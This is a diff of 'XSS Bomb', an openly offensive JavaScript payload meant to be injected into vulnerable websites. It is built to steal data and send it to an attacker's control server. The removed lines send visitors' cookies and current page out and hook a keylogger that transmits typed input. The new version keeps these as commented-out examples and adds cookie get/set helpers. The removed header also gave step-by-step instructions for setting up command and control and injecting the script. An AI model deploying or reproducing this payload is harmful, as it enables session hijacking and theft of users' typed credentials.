@@ -5,36 +5,28 @@
  * (_/\_)(___/(___/     0088MM
  *                      `9MMP'
  *
- * File Name: xss_bomb.js
+ * File Name: bomb.js
  * Made by: p4p1 (Leo Smith)
- * Web Page: https://leosmith.xyz
+ * Web Page: https://leosmith.wtf/xss
  *
  * Description:
- *  XSS Bomb is an xss file used to do some reconnaissance and gather data
- *  on vulnerable websites. If you wish to reuse this file, please go through
+ *  XSS Bomb is an xss file used as a toolkit for web exploits on vulnerable
+ *  websites. If you wish to reuse this file, please go through
  *  the step by step guide on how to use it inside of this file.
- * Usage:
- *  You can look for the {CHANGEME} string inside of this file to know what you
- *  need to change.
- * Step by Step guide:
- *  1. Configure the script
- *  2. Setup a command and control sever to receive the data
- *  3. Inject the script inside of a webpage
- *  4. Inspect the data on your server
  */
 
 /*
  * Configuration variables
  */
-const version = '0.0.1';
+const version = '0.0.2';
 const color = 'background: #000; color: #bada55';
 const color_ok = 'background: #000; color: #01FE23';
 const color_ko = 'background: #000; color: #FE0101';
 const verbose_mode = 1;
 
-const request_type = '{CHANGEME}'; // can be changed to 'POST' or others if needed
+const request_type = 'GET'; // can be changed to 'POST' or others if needed
 const server_control = '{CHANGEME}';
-                            /* here you should provide you server where you can
+                            /* here you should provide your api server to
                                log the received input */
 /*
  * global variables
@@ -42,7 +34,7 @@ const server_control = '{CHANGEME}';
 var input_text = "";
 
 /*
- * Functions
+ * Function to check the status of the server
  */
 function check_server() {
   const request = new Request(server_control + '/status_check', {
@@ -56,6 +48,9 @@ function check_server() {
   });
 }
 
+/*
+ * A function to send data back to your xss_bomb instance
+ */
 function send_server(data) {
   var request = undefined;
   if (request_type == 'POST') {
@@ -81,6 +76,9 @@ function send_server(data) {
   });
 }
 
+/*
+ * A wrapper to send keypress to a server every time Enter is pressed
+ */
 function send_key(event) {
   if (event.key == 'Enter' && input_text.length > 0) {
     send_server("keypress=" + input_text);
@@ -93,6 +91,32 @@ function send_key(event) {
 }
 
 /*
+ * A funciton to get a specific cookie
+ */
+function getCookie(t) {
+  let e=t+"=",n=decodeURIComponent(document.cookie).split(";");
+  for(let r=0;r<n.length;r++){
+    let i=n[r];
+    for(;" "==i.charAt(0);)
+      i=i.substring(1);
+    if(0==i.indexOf(e))
+      return i.substring(e.length,i.length)
+  }
+  return ("");
+}
+
+/*
+ * A funciton to set a cookie
+ */
+function setCookie(cname, cvalue, exdays) {
+  const d = new Date();
+  d.setTime(d.getTime() + (exdays * 24 * 60 * 60 * 1000));
+  let expires = "expires="+d.toUTCString();
+  document.cookie = cname + "=" + cvalue + ";" + expires + ";path=/";
+}
+
+
+/*
  * Main Script
  */
 if (verbose_mode) {
@@ -101,7 +125,7 @@ if (verbose_mode) {
   console.log("%c            )  ( \\__ \\\\__ \\            ,d08b.  '|`                 ", color);
   console.log("%c           (_/\\_)(___/(___/            0088MM                      ", color);
   console.log("%c                                       `9MMP'                      ", color);
-  console.log("%c  WELCOME TO XSS BOMB!!! - Version: %s - https://leosmith.xyz/  ", color, version);
+  console.log("%c  WELCOME TO XSS BOMB!!! - Version: %s - https://leosmith.wtf/xss  ", color, version);
   console.log("%c  Config:", color);
   console.log("%c  \tControl Server = %s", color, server_control);
   console.log("%c  \tRequest Types = %s", color, request_type);
@@ -113,7 +137,10 @@ if (verbose_mode) {
   check_server();
 }
 
-send_server("cookies=" + document.cookie +
-"&current_page=" + document.location.href +
-"&resolution=" + screen.width + "x" + screen.height);
-document.addEventListener('keypress', send_key);
+/*
+ * Examples
+ */
+// Upload data to the server
+//send_server("cookies=" + document.cookie + "&current_page=" + document.location.href + "&resolution=" + screen.width + "x" + screen.height);
+// Hook the keylogger on event listeners
+//document.addEventListener('keypress', send_key);
